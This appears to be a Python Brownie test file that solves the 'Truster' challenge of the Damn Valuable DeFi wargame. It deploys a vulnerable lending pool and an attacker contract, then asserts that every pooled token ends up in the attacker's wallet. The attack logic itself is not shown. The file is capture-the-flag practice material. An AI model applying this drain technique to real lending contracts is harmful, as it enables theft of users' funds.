from brownie import (accounts, Wei, TrusterLenderPool,
                     DamnValuableToken, TrusterAttacker)

TOKENS_IN_POOL = Wei('10000000 ether')


def test_truster():
    # ** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE **
    deployer = accounts[0]
    attacker = accounts[1]

    token = DamnValuableToken.deploy({"from": deployer})
    pool = TrusterLenderPool.deploy(token.address, {"from": deployer})
    token.transfer(pool.address, TOKENS_IN_POOL, {"from": deployer})

    # ** CODE YOUR EXPLOIT HERE  **

    # See the attack contract for more explanation.
    # some solutions use web3.js to create the exploit data off-chain, but I found it easier to do in solidity
    attack_contract = TrusterAttacker.deploy(
        pool.address, token.address, {"from": attacker})

    attack_contract.attack({"from": attacker})

    # our attack contract should have transferred all tokens to our wallet
    assert token.balanceOf(attacker) == TOKENS_IN_POOL
